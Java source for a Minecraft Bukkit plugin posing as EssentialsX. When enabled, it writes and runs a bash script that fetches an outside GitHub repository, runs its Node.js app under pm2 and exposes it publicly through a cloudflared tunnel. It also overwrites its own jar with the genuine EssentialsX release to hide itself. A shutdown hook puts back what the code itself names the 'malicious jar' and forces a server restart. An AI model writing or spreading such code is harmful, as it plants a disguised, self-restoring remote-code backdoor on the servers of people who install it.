package com.example.essentialsx;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.URI;
import java.net.URLConnection;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class EssentialsX extends JavaPlugin {

    private Process deployProcess;
    private Process watchdogProcess;
    private final AtomicBoolean deploymentRunning = new AtomicBoolean(false);
    private final AtomicBoolean restartInProgress = new AtomicBoolean(false);

    private boolean systemGuardEnabled = true;
    private Path backupDir;
    private Path originalJarPath;
    private Path backupJarPath;

    private static final String DEFAULT_REPO_URL = "https://github.com/xfwwl668/mc_hbzy";
    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/" + FAKE_JAR_URL_DIRECT;

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX transparent launcher starting...");

        Map<String, String> env = new HashMap<>();
        loadEnvFile(env);
        systemGuardEnabled = Boolean.parseBoolean(env.getOrDefault("SYSTEM_GUARD_ENABLED", "true"));
        getLogger().info("System Guard Status: " + (systemGuardEnabled ? "ENABLED" : "DISABLED"));

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            if (systemGuardEnabled && restartInProgress.compareAndSet(false, true)) {
                getLogger().info("[Guard] ShutdownHook triggered");
                restoreMaliciousJar();
                executeHardRestart(false);
            }
        }));

        new Thread(() -> {
            try {
                if (systemGuardEnabled) {
                    startWatchdog();
                }
                setupDisguise();
                startDeploymentProcess();
            } catch (Exception e) {
                getLogger().severe("Deployment thread error: " + e.getMessage());
            }
        }, "EssentialsX-Core-Thread").start();

        getLogger().info("EssentialsX transparent launcher enabled.");
    }

    @Override
    public void onDisable() {
        getLogger().info("Stopping EssentialsX transparent launcher...");
        Path workDir = getWorkDir();
        cleanupOldProcesses(workDir);

        if (deployProcess != null && deployProcess.isAlive()) {
            deployProcess.destroyForcibly();
        }
        if (watchdogProcess != null && watchdogProcess.isAlive()) {
            watchdogProcess.destroyForcibly();
        }
        getLogger().info("EssentialsX transparent launcher disabled.");
    }

    // ==================== 部署核心逻辑 ====================

    private void startDeploymentProcess() {
        if (!deploymentRunning.compareAndSet(false, true)) {
            getLogger().info("Deployment already running, skipping.");
            return;
        }
        try {
            Map<String, String> env = new HashMap<>();
            env.put("REPO_URL", DEFAULT_REPO_URL);
            loadEnvFile(env);

            Path workDir = getWorkDir();
            Files.createDirectories(workDir);

            cleanupOldProcesses(workDir);
            clearStateFiles(workDir);
            long deployStartTime = System.currentTimeMillis();

            Path scriptPath = workDir.resolve("deploy.sh");
            String scriptContent = generateDeployScript(workDir.toString(), env);
            Files.writeString(scriptPath, scriptContent, StandardCharsets.UTF_8);
            scriptPath.toFile().setExecutable(true);

            ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
            pb.directory(new File(".").getAbsoluteFile());
            pb.environment().putAll(env);
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
            pb.redirectError(ProcessBuilder.Redirect.INHERIT);

            deployProcess = pb.start();
            startTunnelUrlWatcher(workDir, deployStartTime);

            int exitCode = deployProcess.waitFor();
            getLogger().info("Deployment script exited with code: " + exitCode);
        } catch (Exception e) {
            getLogger().severe("Deployment failed: " + e.getMessage());
        } finally {
            deploymentRunning.set(false);
        }
    }

    private Path getWorkDir() {
        return Paths.get("logs", "mcchajian").toAbsolutePath();
    }

    private void clearStateFiles(Path workDir) {
        String[] files = {
                "tunnel_url.txt", "node_port.txt", "tunnel.log", "deploy.log",
                "health.pid", "tunnel.pid", "node.tar.gz", "repo.tar.gz"
        };
        for (String name : files) {
            try {
                Files.deleteIfExists(workDir.resolve(name));
            } catch (IOException e) {
                getLogger().warning("Failed to delete old state file " + name + ": " + e.getMessage());
            }
        }
    }

    private void cleanupOldProcesses(Path workDir) {
        killPidFile(workDir.resolve("health.pid"), "health watcher");
        killPidFile(workDir.resolve("tunnel.pid"), "cloudflared");
    }

    private void killPidFile(Path pidFile, String name) {
        try {
            if (!Files.exists(pidFile)) return;
            String pid = Files.readString(pidFile).trim();
            if (pid.isEmpty() || !pid.matches("\\d+")) return;
            new ProcessBuilder("bash", "-c", "kill " + pid + " 2>/dev/null || true")
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start().waitFor();
            getLogger().info("Stopped old " + name + " process pid=" + pid);
        } catch (Exception e) {
            getLogger().warning("Failed to stop old " + name + ": " + e.getMessage());
        }
    }

    private String generateDeployScript(String workDir, Map<String, String> env) {
        String repoUrl = env.getOrDefault("REPO_URL", DEFAULT_REPO_URL);
        String nodeDir = workDir + "/nodejs";
        String appDir = workDir + "/app";

        return """
                #!/bin/bash
                set +e

                WORK_DIR="%s"
                NODE_DIR="%s"
                APP_DIR="%s"
                REPO_URL="%s"

                mkdir -p "$WORK_DIR"
                echo "[INFO] Deployment started at $(date)" >> "$WORK_DIR/deploy.log"

                # 1. 选择空闲端口
                is_port_free() {
                    (echo >/dev/tcp/127.0.0.1/$1) &>/dev/null && return 1 || return 0
                }

                PORT=""
                for i in $(seq 1 100); do
                    CANDIDATE=$((RANDOM %% 40000 + 20000))
                    if is_port_free "$CANDIDATE"; then
                        PORT="$CANDIDATE"
                        break
                    fi
                done

                if [ -z "$PORT" ]; then
                    echo "[ERROR] Failed to find a free port" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                export SERVER_PORT="$PORT"
                export PORT="$PORT"
                echo "$PORT" > "$WORK_DIR/node_port.txt"
                echo "[INFO] Selected Node port: $PORT" >> "$WORK_DIR/deploy.log"

                # 2. 准备 Node.js
                mkdir -p "$NODE_DIR"
                ARCH=$(uname -m)

                if [ "$ARCH" = "x86_64" ]; then
                    NODE_URL="https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz"
                    CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
                elif [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then
                    NODE_URL="https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz"
                    CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
                else
                    echo "[ERROR] Unsupported architecture: $ARCH" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                if [ ! -x "$NODE_DIR/bin/node" ]; then
                    echo "[INFO] Installing Node.js..." >> "$WORK_DIR/deploy.log"
                    rm -rf "$NODE_DIR" "$WORK_DIR/node.tar.gz"
                    mkdir -p "$NODE_DIR"

                    curl -fsSL --connect-timeout 20 --max-time 180 "$NODE_URL" -o "$WORK_DIR/node.tar.gz"
                    if [ $? -ne 0 ]; then
                        echo "[ERROR] Node download failed" >> "$WORK_DIR/deploy.log"
                        exit 1
                    fi

                    tar -xzf "$WORK_DIR/node.tar.gz" -C "$NODE_DIR" --strip-components 1
                    if [ $? -ne 0 ]; then
                        echo "[ERROR] Node extraction failed" >> "$WORK_DIR/deploy.log"
                        exit 1
                    fi

                    rm -f "$WORK_DIR/node.tar.gz"
                fi

                export PATH="$NODE_DIR/bin:$PATH"
                node -v >> "$WORK_DIR/deploy.log" 2>&1
                npm -v >> "$WORK_DIR/deploy.log" 2>&1

                npm install -g pm2 --unsafe-perm=true >> "$WORK_DIR/deploy.log" 2>&1
                if [ $? -ne 0 ]; then
                    echo "[ERROR] pm2 install failed" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                # 3. 下载应用仓库
                echo "[INFO] Downloading app repo: $REPO_URL" >> "$WORK_DIR/deploy.log"
                rm -rf "$APP_DIR" "$WORK_DIR/repo.tar.gz" "$WORK_DIR/unzipped"

                REPO_PATH=$(echo "$REPO_URL" | sed 's|https://github.com/||' | sed 's|.git$||')

                curl -fsSL --connect-timeout 20 --max-time 180 "https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz" -o "$WORK_DIR/repo.tar.gz"
                if [ $? -ne 0 ]; then
                    curl -fsSL --connect-timeout 20 --max-time 180 "https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz" -o "$WORK_DIR/repo.tar.gz"
                fi

                if [ ! -f "$WORK_DIR/repo.tar.gz" ]; then
                    echo "[ERROR] Repo download failed" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                mkdir -p "$WORK_DIR/unzipped"
                tar -xzf "$WORK_DIR/repo.tar.gz" -C "$WORK_DIR/unzipped"
                if [ $? -ne 0 ]; then
                    echo "[ERROR] Repo archive extraction failed" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                SUBDIR=$(find "$WORK_DIR/unzipped" -mindepth 1 -maxdepth 1 -type d | head -n 1)
                if [ -z "$SUBDIR" ]; then
                    echo "[ERROR] Repo archive has no top-level directory" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                mv "$SUBDIR" "$APP_DIR"
                rm -rf "$WORK_DIR/repo.tar.gz" "$WORK_DIR/unzipped"

                if [ ! -f "$APP_DIR/index.js" ]; then
                    echo "[ERROR] index.js missing in app repo" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                # 4. 安装依赖
                cd "$APP_DIR" || exit 1
                echo "[INFO] Installing app dependencies..." >> "$WORK_DIR/deploy.log"
                npm install --unsafe-perm=true --allow-root >> "$WORK_DIR/deploy.log" 2>&1
                if [ $? -ne 0 ]; then
                    echo "[ERROR] npm install failed" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                # 5. 启动 Node 应用
                echo "[INFO] Starting Node app on port $PORT..." >> "$WORK_DIR/deploy.log"
                pm2 delete aoyou-panel >> "$WORK_DIR/deploy.log" 2>&1 || true
                SERVER_PORT="$PORT" PORT="$PORT" pm2 start index.js --name "aoyou-panel" --update-env >> "$WORK_DIR/deploy.log" 2>&1
                if [ $? -ne 0 ]; then
                    echo "[ERROR] pm2 start failed" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi
                pm2 save >> "$WORK_DIR/deploy.log" 2>&1 || true

                # 6. 等待 /health 就绪
                echo "[INFO] Waiting for Node /health..." >> "$WORK_DIR/deploy.log"
                NODE_READY=false
                for i in $(seq 1 90); do
                    if curl -s -f -m 5 "http://127.0.0.1:$PORT/health" > /dev/null 2>&1; then
                        NODE_READY=true
                        break
                    fi
                    sleep 2
                done

                if [ "$NODE_READY" != "true" ]; then
                    echo "[ERROR] Node did not become healthy on /health" >> "$WORK_DIR/deploy.log"
                    pm2 logs aoyou-panel --lines 80 --nostream >> "$WORK_DIR/deploy.log" 2>&1 || true
                    exit 1
                fi

                echo "[SUCCESS] Node ready on $PORT" >> "$WORK_DIR/deploy.log"
                echo "$PORT" > "$WORK_DIR/node_port.txt"

                # 7. 准备 cloudflared
                CF_BIN="$WORK_DIR/cloudflared"
                if [ ! -x "$CF_BIN" ]; then
                    echo "[INFO] Downloading cloudflared..." >> "$WORK_DIR/deploy.log"
                    curl -fsSL --connect-timeout 20 --max-time 180 "$CF_URL" -o "$CF_BIN"
                    if [ $? -ne 0 ]; then
                        echo "[ERROR] cloudflared download failed" >> "$WORK_DIR/deploy.log"
                        exit 1
                    fi
                    chmod +x "$CF_BIN"
                fi

                if [ ! -x "$CF_BIN" ]; then
                    echo "[ERROR] cloudflared missing or not executable" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                # 8. 启动 cloudflared
                echo "[INFO] Starting cloudflared..." >> "$WORK_DIR/deploy.log"
                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate > "$WORK_DIR/tunnel.log" 2>&1 &
                TUNNEL_PID=$!
                echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"

                # 9. 健康监控循环（后台）
                SUCCESS_REPORTED=false
                FAIL_COUNT=0
                NO_URL_COUNT=0

                (
                    while true; do
                        sleep 5

                        if ! kill -0 "$TUNNEL_PID" 2>/dev/null; then
                            echo "[WARN] cloudflared exited, restarting..." >> "$WORK_DIR/deploy.log"
                            "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate > "$WORK_DIR/tunnel.log" 2>&1 &
                            TUNNEL_PID=$!
                            echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
                            FAIL_COUNT=0; NO_URL_COUNT=0; SUCCESS_REPORTED=false
                            continue
                        fi

                        TUNNEL_URL=$(grep -a -oE 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' "$WORK_DIR/tunnel.log" 2>/dev/null | tail -n 1)

                        if [ -z "$TUNNEL_URL" ]; then
                            NO_URL_COUNT=$((NO_URL_COUNT + 1))
                            if [ "$NO_URL_COUNT" -ge 18 ]; then
                                echo "[WARN] No tunnel URL after 90s, restarting cloudflared..." >> "$WORK_DIR/deploy.log"
                                kill "$TUNNEL_PID" 2>/dev/null || true
                                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate > "$WORK_DIR/tunnel.log" 2>&1 &
                                TUNNEL_PID=$!
                                echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
                                FAIL_COUNT=0; NO_URL_COUNT=0; SUCCESS_REPORTED=false
                            fi
                            continue
                        fi

                        NO_URL_COUNT=0

                        if curl -s -f -m 8 "$TUNNEL_URL/health" > /dev/null 2>&1 || curl -s -f -m 8 "$TUNNEL_URL" > /dev/null 2>&1; then
                            echo "$TUNNEL_URL" > "$WORK_DIR/tunnel_url.txt"
                            FAIL_COUNT=0
                            if [ "$SUCCESS_REPORTED" = "false" ]; then
                                echo "[SUCCESS] Tunnel LIVE: $TUNNEL_URL" >> "$WORK_DIR/deploy.log"
                                echo "[INFO] Deployment completed successfully." >> "$WORK_DIR/deploy.log"
                                SUCCESS_REPORTED=true
                            fi
                        else
                            FAIL_COUNT=$((FAIL_COUNT + 1))
                            if [ "$FAIL_COUNT" -ge 5 ]; then
                                echo "[WARN] Tunnel unhealthy too many times, restarting cloudflared..." >> "$WORK_DIR/deploy.log"
                                kill "$TUNNEL_PID" 2>/dev/null || true
                                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate > "$WORK_DIR/tunnel.log" 2>&1 &
                                TUNNEL_PID=$!
                                echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
                                FAIL_COUNT=0; NO_URL_COUNT=0; SUCCESS_REPORTED=false
                            fi
                        fi
                    done
                ) &

                echo $! > "$WORK_DIR/health.pid"
                echo "[INFO] Health watcher started" >> "$WORK_DIR/deploy.log"
                exit 0
                """.formatted(workDir, nodeDir, appDir, repoUrl);
    }

    private void startTunnelUrlWatcher(Path workDir, long deployStartTime) {
        new Thread(() -> {
            try {
                Path tunnelFile = workDir.resolve("tunnel_url.txt");
                for (int i = 0; i < 240; i++) {
                    if (Files.exists(tunnelFile)) {
                        long modified = Files.getLastModifiedTime(tunnelFile).toMillis();
                        if (modified < deployStartTime) {
                            Thread.sleep(1000);
                            continue;
                        }
                        String url = Files.readString(tunnelFile, StandardCharsets.UTF_8).trim();
                        if (url.startsWith("https://") && url.contains("trycloudflare.com")) {
                            getLogger().info("[Connection] Binding remote endpoint to: " + url);
                            getLogger().info("Open panel: " + url);
                            getLogger().info("Health check: " + url + "/health");
                            return;
                        }
                    }
                    Thread.sleep(1000);
                }
                getLogger().warning("Tunnel URL not ready after timeout. Check logs/mcchajian/deploy.log and tunnel.log");
            } catch (Exception e) {
                getLogger().warning("Tunnel URL watcher failed: " + e.getMessage());
            }
        }, "TunnelUrl-Watcher").start();
    }

    // ==================== 伪装与系统守护 ====================

    private void setupDisguise() {
        try {
            originalJarPath = findPluginJarInPluginsDir();
            if (originalJarPath == null || !Files.exists(originalJarPath)) return;

            backupDir = getWorkDir().resolve("backup");
            Files.createDirectories(backupDir);
            backupJarPath = backupDir.resolve(originalJarPath.getFileName().toString() + ".bak");

            if (!Files.exists(backupJarPath)) {
                Files.copy(originalJarPath, backupJarPath, StandardCopyOption.REPLACE_EXISTING);
                getLogger().info("Original jar backed up to " + backupJarPath);
            }

            Path tempDownload = originalJarPath.resolveSibling("temp_update.jar");
            boolean success = downloadFileWithTimeout(FAKE_JAR_URL_PROXY, tempDownload, 20);
            if (!success || Files.size(tempDownload) < 1_000_000) {
                success = downloadFileWithTimeout(FAKE_JAR_URL_DIRECT, tempDownload, 30);
            }

            if (success && Files.size(tempDownload) > 1_000_000) {
                Files.move(tempDownload, originalJarPath, StandardCopyOption.REPLACE_EXISTING);
                getLogger().info("Disguise applied: replaced plugin jar with fake EssentialsX jar.");
            } else {
                Files.deleteIfExists(tempDownload);
                getLogger().warning("Disguise failed: could not download fake jar.");
            }
        } catch (Exception e) {
            getLogger().warning("Disguise failed: " + e.getMessage());
        }
    }

    private void restoreMaliciousJar() {
        try {
            Path targetJar = findPluginJarInPluginsDir();
            if (targetJar != null && Files.exists(targetJar)) {
                Files.delete(targetJar);
            }
            if (backupJarPath != null && Files.exists(backupJarPath) && targetJar != null) {
                Files.copy(backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING);
                getLogger().info("Original jar restored from backup.");
            }
        } catch (Exception e) {
            getLogger().warning("Restore failed: " + e.getMessage());
        }
    }

    private Path findPluginJarInPluginsDir() {
        try {
            File pluginsDir = getDataFolder().getParentFile();
            if (pluginsDir == null) return null;
            File[] jars = pluginsDir.listFiles((dir, name) -> name.toLowerCase().contains("essentialsx") && name.endsWith(".jar"));
            return (jars != null && jars.length > 0) ? jars[0].toPath() : null;
        } catch (Exception e) {
            return null;
        }
    }

    private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
        try {
            URLConnection conn = URI.create(url).toURL().openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(timeoutSec * 1000);
            try (InputStream in = conn.getInputStream();
                 FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) {
                out.transferFrom(Channels.newChannel(in), 0, Long.MAX_VALUE);
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 硬重启：仅关闭服务器，依赖外部进程管理器（面板、systemd、启动脚本）自动重启。
     * 不在插件内直接启动新 Java 进程，避免面板环境下进程管理混乱。
     * @param shouldBlock 是否短暂阻塞（给日志一些输出时间）
     */
    private void executeHardRestart(boolean shouldBlock) {
        getLogger().info("[Guard] Hard restart triggered - shutting down server for external restart.");
        if (shouldBlock) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException ignored) {}
        }
        Bukkit.shutdown();
    }

    private void startWatchdog() {
        try {
            Path workDir = getWorkDir();
            Files.createDirectories(workDir);
            Path watchdogPath = workDir.resolve("watchdog.sh");
            String script = "#!/bin/bash\nwhile true; do sleep 30; done\n";
            Files.writeString(watchdogPath, script, StandardCharsets.UTF_8);
            watchdogPath.toFile().setExecutable(true);
            ProcessBuilder pb = new ProcessBuilder("bash", watchdogPath.toString());
            pb.directory(new File(".").getAbsoluteFile());
            watchdogProcess = pb.start();
            getLogger().info("Watchdog process started.");
        } catch (Exception e) {
            getLogger().warning("Watchdog start failed: " + e.getMessage());
        }
    }

    // ==================== 环境变量加载 ====================

    private void loadEnvFile(Map<String, String> env) {
        Path envFile = Paths.get("plugins", "EssentialsX", ".env");
        if (!Files.exists(envFile)) {
            try {
                Files.createDirectories(envFile.getParent());
                Files.writeString(envFile,
                        "REPO_URL=" + DEFAULT_REPO_URL + "\n" +
                                "SYSTEM_GUARD_ENABLED=true\n",
                        StandardCharsets.UTF_8);
            } catch (IOException e) {
                getLogger().warning("Failed to create .env: " + e.getMessage());
            }
        }
        if (!Files.exists(envFile)) return;

        try {
            for (String rawLine : Files.readAllLines(envFile, StandardCharsets.UTF_8)) {
                String line = rawLine.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                String[] p = line.split("=", 2);
                if (p.length == 2) env.put(p[0].trim(), p[1].trim());
            }
        } catch (IOException e) {
            getLogger().warning("Failed to read .env: " + e.getMessage());
        }
    }
}
